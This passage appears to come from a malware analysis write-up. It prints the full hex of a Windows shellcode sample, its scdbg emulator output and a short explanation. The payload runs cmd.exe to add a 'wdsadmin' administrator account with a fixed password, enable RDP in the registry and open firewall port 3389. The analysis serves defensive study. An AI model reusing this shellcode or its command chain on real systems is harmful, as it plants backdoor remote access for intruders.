0x4f,0x52,0x44,0x20,0x2f,0x64,0x20,0x30,0x20,0x2f,0x66,0x20,0x26,0x20,0x6e,0x65,0x74,0x73,0x68,0x20,0x61,0x64,0x76,0x66,0x69,0x72,0x65,0x77,0x61,0x6c,0x6c,0x20,0x66,0x69,0x72,0x65,0x77,0x61,0x6c,0x6c,0x20,0x61,0x64,0x64,0x20,0x72,0x75,0x6c,0x65,0x20,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x4f,0x70,0x65,0x6e,0x20,0x52,0x65,0x6d,0x6f,0x74,0x65,0x20,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x22,0x20,0x70,0x72,0x6f,0x74,0x6f,0x63,0x6f,0x6c,0x3d,0x54,0x43,0x50,0x20,0x64,0x69,0x72,0x3d,0x69,0x6e,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x70,0x6f,0x72,0x74,0x3d,0x33,0x33,0x38,0x39,0x20,0x61,0x63,0x74,0x69,0x6f,0x6e,0x3d,0x61,0x6c,0x6c,0x6f,0x77,0x22,0x00

The '0x' was removed from each of those above value and was saved as 'shellcode.txt'.

fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5636d642e657865202f6b20226e6574206c6f63616c67726f7570202252656d6f7465204465736b746f7020557365727322202f6164642026206e65742075736572202f6164642077647361646d696e2071717171313131312026206e6574206c6f63616c67726f75702061646d696e6973747261746f72732077647361646d696e202f6164642026206e6574206c6f63616c67726f7570202252656d6f7465204465736b746f70205573657273222077647361646d696e202f616464202620726567206164642022484b45595f4c4f43414c5f4d414348494e455c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c2053657276657222202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f642030202f662026206e65747368206164766669726577616c6c206669726577616c6c206164642072756c65206e616d653d224f70656e2052656d6f7465204465736b746f70222070726f746f636f6c3d544350206469723d696e206c6f63616c706f72743d3333383920616374696f6e3d616c6c6f772200

Now the shellcode was decoded using scdbg tool with the command.

`scdbg /f shellcode.txt -s -1`

    Loaded 4c4 bytes from file shellcode.txt
    Detected straight hex encoding input format converting...
    Initialization Complete..
    Max Steps: -1
    Using base offset: 0x401000
    
    401099  WinExec(cmd.exe /k "net localgroup "Remote Desktop Users" /add & net user /add wdsadmin qqqq1111 & net localgroup administrators wdsadmin /add & net localgroup "Remote Desktop Users" wdsadmin /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow")
    4010a5  GetVersion()
    4010b8  ExitProcess(0)
    
    Stepcount 553800

Here, the shellcode seems to be spawing instance of cmd.exe using WinExec to:
- Adds wdsadmin and qqqq1111 users to Administrator and ‘Remote Desktop Users’ group
- Add registry value under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server with value 0 to enable RDP connections
- Create firewall rule named ‘Open Remote Desktop’ to allow inbound RDP connection over port 3389
